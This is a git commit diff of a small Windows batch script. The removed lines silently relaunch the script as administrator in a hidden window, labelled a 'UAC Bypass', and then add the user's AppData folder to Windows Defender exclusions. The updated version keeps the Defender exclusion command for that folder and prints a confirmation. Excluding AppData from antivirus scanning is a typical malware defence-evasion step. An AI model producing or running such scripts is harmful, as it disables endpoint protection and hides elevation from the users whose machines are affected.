8acb42119adcd77250a20bcd367699177e228978
evanffx <sazzadjr4141@gmail.com>
2025-11-03 00:18:52 +0600

    Update script.bat

--- script.bat
+++ script.bat
@@ -1,18 +1,4 @@
 @echo off
->nul 2>&1
-
-:: UAC Bypass - Get admin privileges silently
-net session >nul 2>&1
-if %errorlevel% neq 0 (
-    powershell -Command "Start-Process cmd -ArgumentList '/c %0' -Verb RunAs -WindowStyle Hidden"
-    exit
-)
-
-:: Now running as admin silently
-echo Running as administrator...
-
-:: Your batch code here
-echo Adding Defender exclusions...
-powershell -Command "Add-MpPreference -ExclusionPath '%APPDATA%'" >nul 2>&1
-
+powershell -Command "Add-MpPreference -ExclusionPath '%APPDATA%'"
+echo Roaming folder added to Windows Defender exclusions.
 exit
